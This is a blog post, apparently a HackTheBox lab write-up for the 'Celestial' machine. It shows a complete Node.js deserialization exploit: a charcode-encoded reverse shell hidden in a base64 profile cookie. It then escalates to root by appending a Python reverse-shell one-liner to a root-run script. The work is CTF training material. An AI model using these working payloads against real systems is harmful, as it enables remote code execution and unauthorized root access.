---
layout: post
title:  "HackTheBox Writeup: Celestial"
date:   2018-04-24 00:00:00 -0400
categories: master
---

An nmap port scan reveals that port 3000 to be the only open port.
```
nmap -p 1-65535 -sV -sS -T4 10.10.10.85 -v
[snip]
map scan report for 10.10.10.85
Host is up (0.20s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
```

Going to that port in a browser reveals a 404. Exciting.

![404 on port 3000](https://i.imgur.com/zZwz6Bb.png "404 on port 3000 on 
Celestial")

However, the site does generate a cookie named `profile` which looks to 
be base64 encoded.

![Profile cookie on Celestial](https://i.imgur.com/nSZhXvp.png "Base64 
Profile Cookie")

```
eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb
21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==
``` 

Which decodes to:
```
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```

This could be a hint that we are looking for a deserialization 
vulnerability. A quick google search of `Node.js Express Framework 
exploit` turns up a [blog 
post](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) 
that gives us exactly what we're looking 
for. In summary, the web application decodes the `profile` cookie and 
passes it to the `unserialize()` function.

Following along, I downloaded the 
[nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) 
which generates a Node.js reverse shell.

```
root@kali:~# python nodejsshell.py 10.10.14.78 4444
[+] LHOST = 10.10.14.78
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,
105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,
61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,
101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,
46,49,52,46,55,56,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,
79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,
83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,
116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,
32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,
111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,
41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,
79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,
116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,
118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,
111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,
110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,
110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,
112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,
32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,
101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,
110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,
32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,
105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,
114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,
32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,
40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,
32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,
116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,
32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,
111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,
32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,
82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,
40,72,79,83,84,44,80,79,82,84,41,59,10))
```
We also have to add `{"rce":"_$$ND_FUNC$$_function (){ ` to the 
beginning and `}()"}` to the end of the output. Encoding the entire 
snippet with Base64 and passing that off to the `profile` cookie gives 
us a reverse shell. We can do this using BurpSuite Proxy.

![injecting code via Burp Suite Proxy](https://i.imgur.com/bfWbBl2.png 
"Injecting a Node.js reverse shell using Burp Suite Proxy")

Firing off the request gives us our first shell.

![low privilege shell](https://i.imgur.com/GdJentD.png "Low Privilege 
Shell on Celestial")

We see we have an `output.txt` in the current directory, which is owned 
by root.
```
$ ls
ls
Desktop    examples.desktop  output.txt  script.py  Videos
Documents  Music	     Pictures	 server.js
Downloads  node_modules      Public	 Templates
$ cat output.txt
cat output.txt
Script is running...
$ ls -lah output.txt
ls -lah output.txt
-rw-r--r-- 1 root root 21 Apr 25 01:35 output.txt
```

In the `Documents` directory, we have `script.py`
```
$ cd Documents
cd Documents
$ ls
ls
script.py  user.txt
$ cat script.py
cat script.py
print "Script is running..."
$ ls -lah script.py
ls -lah script.py
-rwxrwxrwx 1 sun sun 29 Sep 21  2017 script.py
```

What's interesting is that the script is owned by a normal user while 
the output file is owned by root.  I suspect injecting a python 
reverse 
shell into `script.py` will give us a shell with root privileges.

```
$ echo 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.78",1234));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);' >> script.py
```

After waiting a few moments, we get our shell with root privileges.

![root shell](https://i.imgur.com/FektGSs.png "Root Shell 
on Celestial")
